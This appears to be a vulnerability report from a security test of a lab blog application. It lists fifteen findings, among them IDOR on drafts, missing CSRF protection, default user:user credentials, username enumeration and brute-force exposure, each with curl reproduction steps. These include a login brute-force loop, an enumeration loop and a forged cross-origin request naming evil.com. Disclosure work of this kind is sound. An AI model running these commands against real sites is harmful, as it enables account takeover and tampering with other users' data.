title: IDOR - Unauthorized Read Access to Any User's Draft
description: The /edit_draft/<id> endpoint does not verify that the requesting user owns the draft. Any authenticated user can read any other user's draft by simply iterating over draft IDs. Draft IDs are sequential integers, making enumeration trivial. The admin's draft (ID 1) containing potentially sensitive content can be read by any authenticated user (user:user, testuser, etc.).
steps:
1. Register and login as any unprivileged user (e.g., testuser:TestPass123).
2. Capture the session cookie.
3. Send GET http://blog:5003/edit_draft/1 with your session cookie.
4. The response shows the admin's draft title and content without any authorization check.
5. curl -s http://blog:5003/edit_draft/1 -b 'session=<YOUR_SESSION>'

title: IDOR - Unauthorized Write/Modify Access to Any User's Draft
description: The /edit_draft/<id> POST endpoint does not verify ownership. Any authenticated user can overwrite any other user's draft by sending a POST request with a different draft ID. This was exploited to modify admin's draft (ID 1) from 'admin_draft' to attacker-controlled content.
steps:
1. Login as any unprivileged user (e.g., testuser:TestPass123).
2. POST to http://blog:5003/edit_draft/1 with your session cookie and arbitrary title/content.
3. curl -s http://blog:5003/edit_draft/1 -X POST -b 'session=<SESSION>' --data-urlencode 'title=HACKED' --data-urlencode 'content=Malicious content' --data-urlencode 'submit=Save Draft'
4. The admin's draft is overwritten. Confirmed by visiting /admin/drafts.

title: IDOR - Unauthorized Access to Any User's Draft Listing
description: The /{username}/drafts endpoint does not enforce that the logged-in user can only view their own drafts. Any authenticated user can view the complete draft list of any other user by navigating to /{target_username}/drafts. This exposes potentially sensitive draft titles and IDs for all users.
steps:
1. Login as testuser:TestPass123. 2. Navigate to http://blog:5003/admin/drafts using the testuser session cookie. 3. The page renders admin's private draft list with titles and IDs. 4. curl -s http://blog:5003/admin/drafts -b 'session=' 5. Response: '

admin's Drafts

' with all admin drafts listed.

title: Missing CSRF Protection on All State-Changing Endpoints
description: None of the application's POST endpoints (login, register, create_draft, edit_draft) implement CSRF token validation. The session cookie lacks the SameSite attribute, allowing cross-origin requests to carry authentication cookies. An attacker can host a malicious page that silently modifies victims' drafts or performs other actions on their behalf when they visit the page.
steps:
1. Ensure a victim is logged in to the blog application.
2. Send a cross-origin POST to /edit_draft/2 on behalf of the victim:
   curl -s http://blog:5003/edit_draft/2 -X POST -b 'session=<VICTIM_SESSION>' -H 'Origin: http://evil.com' -H 'Referer: http://evil.com/csrf.html' --data-urlencode 'title=CSRF Title' --data-urlencode 'content=CSRF Content' --data-urlencode 'submit=Save Draft'
3. The request succeeds (HTTP 302) without any CSRF token required.
4. A real attack would use a hidden HTML form on a malicious page that auto-submits when the victim visits it.

title: No Rate Limiting on Login Endpoint - Brute Force Vulnerability
description: The /login endpoint has no rate limiting, CAPTCHA, account lockout, or any other mechanism to prevent brute force password attacks. An attacker can send unlimited login attempts without any throttling. This was verified by sending 10+ consecutive failed login attempts that all returned HTTP 200 without any lockout.
steps:
1. Send repeated POST requests to http://blog:5003/login with the target username and different passwords:
   for i in $(seq 1 100); do curl -s -o /dev/null -w '%{http_code}\n' http://blog:5003/login -X POST -d 'username=admin&password=attempt$i&submit=Login'; done
2. All 100 requests return 200 (wrong password) with no lockout.
3. This allows an attacker to automate password guessing until the correct password is found.

title: Weak Default Credentials - user:user Account
description: The application has a pre-existing account with username 'user' and password 'user'. This trivially guessable credential pair grants full access to the application and, combined with the IDOR vulnerabilities, allows reading and modifying all other users' drafts.
steps:
1. Navigate to http://blog:5003/login.
2. Enter username: user, password: user.
3. Click Login.
4. Successfully authenticated as user, redirected to /user/drafts.
5. From this account, all IDOR vulnerabilities are also exploitable.

title: User Enumeration via Explicit Registration Error Message
description: When attempting to register a username that already exists, the application returns the explicit error message 'Username already exists. Please choose a different one.' This allows an attacker to enumerate valid usernames. If the registration attempt fails with this message, the username is valid; if it succeeds (redirects to /), the username was available.
steps:
1. POST to http://blog:5003/register with an existing username (e.g., 'admin'):
   curl -s http://blog:5003/register -X POST -d 'username=admin&password=test&confirm_password=test&submit=Sign+Up'
2. Response contains: 'Username already exists. Please choose a different one.'
3. POST with a non-existing username (e.g., 'nonexistent999'):
   curl -s http://blog:5003/register -X POST -d 'username=nonexistent999&password=test&confirm_password=test&submit=Sign+Up'
4. Response: 302 redirect to / (registration succeeded - username did not exist).
5. Attackers can systematically probe usernames to build an enumeration list.

title: User Enumeration via Login Timing Attack
description: The login endpoint has a measurable timing difference between existing and non-existing usernames. For existing usernames (e.g., 'admin'), the response takes ~60ms due to password hash verification (bcrypt/scrypt). For non-existing usernames, the response takes ~4ms as it exits immediately without hashing. This allows an attacker to enumerate valid usernames without any explicit error messages.
steps:
1. Measure response time for existing user 'admin':
   time curl -s http://blog:5003/login -X POST -d 'username=admin&password=wrongpass&submit=Login' -o /dev/null
   Result: ~60ms
2. Measure response time for non-existing user 'xyz123xyz':
   time curl -s http://blog:5003/login -X POST -d 'username=xyz123xyz&password=wrongpass&submit=Login' -o /dev/null
   Result: ~4ms
3. The 15x timing difference consistently identifies valid vs. invalid usernames across multiple runs.

title: Username Case Sensitivity Bypass in Registration
description: The registration endpoint treats usernames as case-sensitive while the visual presentation creates confusion. An attacker can register 'Admin', 'ADMIN', 'admin ' (with trailing space) as distinct accounts from the existing 'admin' account. This can facilitate phishing (an attacker's 'Admin' account looks similar to the legitimate 'admin') and may exploit any case-insensitive comparisons elsewhere in the application. All variants registered successfully: Admin (user_id=4), ADMIN (user_id=5).
steps:
1. Attempt to register with username 'admin': fails (already exists).
2. Register with 'Admin' (capital A):
   curl -s http://blog:5003/register -X POST --data-urlencode 'username=Admin' --data-urlencode 'password=hacked123' --data-urlencode 'confirm_password=hacked123' --data-urlencode 'submit=Sign Up'
   Result: 302 redirect - registration succeeded.
3. Login as 'Admin' with password 'hacked123': succeeds, redirected to /Admin/drafts.
4. The 'Admin' account is distinct from 'admin' but visually deceptive.

title: Session Not Invalidated Server-Side on Logout - Session Persistence
description: The application uses client-side Flask sessions (signed cookies) with no server-side session store. When a user logs out, the server clears the client's cookie but does not invalidate the session token itself. An attacker who captures a session cookie (via network sniffing, XSS, or other means) can continue using it indefinitely even after the victim logs out, since the secret key hasn't changed and the signature remains valid.
steps:
1. Login as testuser and capture the session cookie value: SESSION=<cookie_value>
2. Verify the session is valid: curl -s http://blog:5003/dashboard -b 'session=<SESSION>' -> 302 to /testuser/drafts
3. Logout via the application (or directly): curl -s http://blog:5003/logout -b 'session=<SESSION>'
4. The server responds with Set-Cookie: session=; Max-Age=0 (clearing the browser cookie)
5. Test the old session: curl -s http://blog:5003/dashboard -b 'session=<SESSION>' -> still 302 to /testuser/drafts
6. The captured session token is still valid after logout.

title: Missing Security HTTP Response Headers
description: The application's HTTP responses lack multiple important security headers. Missing headers include: (1) X-Frame-Options - allows the app to be embedded in iframes, enabling clickjacking attacks; (2) Content-Security-Policy - no CSP to restrict script execution; (3) X-Content-Type-Options - allows MIME-type sniffing; (4) Referrer-Policy - may leak sensitive URLs to third parties; (5) Permissions-Policy. Only Content-Type and Connection headers are returned.
steps:
1. Send a request to any endpoint:
   curl -sI http://blog:5003/
2. Response headers:
   HTTP/1.1 200 OK
   Server: Werkzeug/3.0.6 Python/3.8.17
   Content-Type: text/html; charset=utf-8
   (no X-Frame-Options, no Content-Security-Policy, no X-Content-Type-Options, no Referrer-Policy)
3. Without X-Frame-Options, the application can be framed by attacker pages to perform clickjacking attacks.

title: Server Version Information Disclosure via Server Header
description: The application discloses the exact server software and version in every HTTP response via the 'Server: Werkzeug/3.0.6 Python/3.8.17' header. This allows attackers to identify the precise technology stack and target known CVEs or version-specific vulnerabilities. Python 3.8 is an end-of-life version (EOL October 2024) which may have unpatched vulnerabilities.
steps:
1. Send any HTTP request to the application:
   curl -sI http://blog:5003/
2. Observe the response header:
   Server: Werkzeug/3.0.6 Python/3.8.17
3. This reveals: Python 3.8.17 (EOL), Werkzeug 3.0.6 (WSGI framework).
4. Attackers can use this to target known vulnerabilities specific to these versions.

title: Session Cookie Missing SameSite Attribute - CSRF Enabler
description: The session cookie issued by the application lacks the SameSite attribute. Without SameSite=Strict or SameSite=Lax, browsers will include the session cookie in cross-origin requests. This directly enables CSRF attacks, as a victim's browser will automatically attach their authenticated session cookie when they click a link or form from an attacker-controlled page. This compounds the impact of the Missing CSRF Protection finding.
steps:
1. Login to the application and observe the Set-Cookie header:
   curl -si http://blog:5003/login -X POST -d 'username=testuser&password=TestPass123&submit=Login'
   Response: Set-Cookie: session=...; HttpOnly; Path=/
2. Note: only HttpOnly and Path are present - no SameSite attribute.
3. Without SameSite, the browser sends this cookie with cross-site POST requests, enabling CSRF.
4. With SameSite=Strict or Lax, cross-site POSTs would not include the cookie, mitigating CSRF.

title: Username Enumeration via /{username}/drafts Route
description: The /{username}/drafts endpoint returns HTTP 200 for valid usernames and HTTP 404 for invalid ones. An authenticated attacker can enumerate all registered usernames by probing this endpoint. This was used to discover the 'user', 'admin', and 'testuser' accounts. The 200/404 discrepancy leaks information about account existence.
steps:
1. Login with any valid account and get a session cookie.
2. Iterate over potential usernames:
   for username in admin user testuser root administrator superuser; do
     code=$(curl -s -o /dev/null -w '%{http_code}' http://blog:5003/$username/drafts -b 'session=<SESSION>')
     echo "$code /$username/drafts"
   done
3. Results: 200 /admin/drafts, 200 /user/drafts, 200 /testuser/drafts, 404 /root/drafts
4. HTTP 200 confirms a valid username; HTTP 404 indicates username does not exist.

title: No Password Strength Enforcement - Single Character Passwords Accepted
description: The application has no minimum password length requirement enforced server-side. A password of a single character ('a') is accepted at registration and allows successful login. The HTML form has no minlength attribute on the password field, and the server performs no strength validation. Combined with the absence of rate limiting, this makes brute-force attacks trivial.
steps:
1. Register a new account with a 1-character password:
   curl -s http://blog:5003/register -X POST --data-urlencode 'username=passvaldtest2' --data-urlencode 'password=a' --data-urlencode 'confirm_password=a' --data-urlencode 'submit=Sign Up'
   Result: HTTP 302 - registration succeeded.
2. Login with the 1-char password:
   curl -si http://blog:5003/login -X POST --data-urlencode 'username=passvaldtest2' --data-urlencode 'password=a' --data-urlencode 'submit=Login'
   Result: HTTP 302, Location: /passvaldtest2/drafts - login succeeded.
3. Any password of length 1+ is accepted, enabling trivially guessable passwords.
